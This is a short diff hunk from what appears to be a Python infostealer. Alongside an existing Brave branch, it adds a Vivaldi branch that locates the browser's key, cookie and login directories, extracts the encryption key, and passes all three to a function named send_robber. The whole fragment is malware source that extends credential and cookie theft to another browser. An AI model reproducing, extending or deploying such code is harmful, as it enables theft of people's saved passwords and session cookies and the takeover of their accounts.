@@ -56,6 +56,10 @@ if __name__ == "__main__":
                 key_directory, cookie_directory, login_directory = steal.get_brave_directories()
                 encryption_key = steal.get_encryption_key(key_directory)
                 send_robber(login_directory, cookie_directory, encryption_key)
+            if steal.vivaldi_exists():
+                key_directory, cookie_directory, login_directory = steal.get_vivaldi_directories()
+                encryption_key = steal.get_encryption_key(key_directory)
+                send_robber(login_directory, cookie_directory, encryption_key)
 
             send_error(sent)
             break
